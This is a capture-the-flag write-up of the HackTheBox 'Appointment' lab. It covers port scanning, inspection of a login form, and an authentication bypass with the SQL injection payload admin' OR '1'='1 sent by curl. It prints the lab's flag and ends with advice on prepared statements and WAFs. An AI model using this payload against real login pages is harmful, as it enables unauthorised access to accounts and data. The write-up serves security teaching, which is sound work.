# Appointment (HTB) - SQL Injection & Authentication Bypass

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux (Debian) | **Difficulty:** Very Easy  
**Focus:** Broken Access Control, Input Sanitization Failures, Boolean Logic, and SQL Injection (SQLi) Authentication Bypass.

---

## 🎯 Executive Summary
The "Appointment" machine demonstrates a critical vulnerability in custom web application development: trusting user input. By identifying an un-sanitized login portal on an Apache web server, we exploited a classic Boolean-based SQL Injection flaw to manipulate the backend database query. This allowed us to entirely bypass the authentication mechanism and retrieve the target flag without requiring valid credentials.

---

## 1. Network Reconnaissance & Target Profiling

We initiated the engagement using `RustScan` to rapidly identify open ports, followed by a targeted `Nmap` service enumeration on the discovered open ports.

```bash
# Rapid Port Discovery
$ rustscan -a 10.129.66.97 --ulimit 5000
Open 10.129.66.97:80

# Targeted Service & Version Detection
$ sudo nmap -sS -sV -sC -O -p 80 10.129.66.97
Starting Nmap 7.94SVN
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
```

**Analysis:**
The scan revealed a single open port (80/TCP) running `Apache 2.4.38`. The `http-title` script indicated the presence of a "Login" page, immediately marking the web application as our primary attack vector.

---

## 2. Web Application Analysis

Instead of interacting via a browser, we utilized `curl` to analyze the raw HTTP response and examine the application's DOM structure.

```bash
$ curl -v -L http://10.129.66.97
< HTTP/1.1 200 OK
< Server: Apache/2.4.38 (Debian)
[...]
<form class="login100-form validate-form" method="post">
    <input class="input100" type="text" name="username" placeholder="Username">
    <input class="input100" type="password" name="password" placeholder="Password">
    <button class="login100-form-btn">Login</button>
</form>
```

**Technical Findings:**
The application presented a standard HTML form utilizing the `POST` method. The input fields (`username` and `password`) are likely parsed by a backend script (e.g., PHP) and concatenated directly into a backend SQL database query to verify credentials.

---

## 3. Exploitation: SQL Injection (Authentication Bypass)

Assuming the backend query resembles the following structure:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

We attempted a classic Boolean-based SQL Injection payload. If the backend fails to sanitize single quotes (`'`), we can break out of the string context and inject arbitrary SQL logic.

**The Payload:** `admin' OR '1'='1`

By injecting this payload into the `username` field, the resulting backend query structurally alters to:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
```

**Execution via `curl`:**
We bypassed the need for a web browser by crafting a malicious `POST` request directly via the terminal.

```bash
$ curl -X POST http://10.129.66.97/ -d "username=admin' OR '1'='1&password=admin' OR '1'='1" -v
> POST / HTTP/1.1
> Host: 10.129.66.97
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Content-Length: 2440
< Content-Type: text/html; charset=UTF-8
[...]
<div><h3>Congratulations!</h3><br><h4>Your flag is: e3d0796d002a446c0e622226f42e9672</h4></div>
```

**Exploit Mechanics:**
The database engine evaluates the injected `OR '1'='1'` condition. Since `1=1` is a universal mathematical truth (Boolean `TRUE`), the entire `WHERE` clause evaluates to `TRUE`. The database ignores the password check and authenticates the session as the first user record in the table (typically the `admin` account).

---

## 4. Defensive Remediation & Secure Coding

To prevent SQL Injection vulnerabilities in enterprise web applications, the following secure coding practices must be implemented:

1. **Prepared Statements (Parameterized Queries):** Never concatenate user input directly into SQL strings. Use Prepared Statements (e.g., `PDO` in PHP). This ensures the database engine treats user input strictly as *data*, not executable SQL code.
2. **Input Sanitization & Escaping:** Implement strict allow-lists for user input and utilize functions like `mysqli_real_escape_string()` (though Prepared Statements are the preferred primary defense).
3. **Web Application Firewall (WAF):** Deploy a WAF (e.g., ModSecurity) with OWASP Core Rule Sets to detect and block common SQLi payloads (like `OR 1=1`) at the network edge.
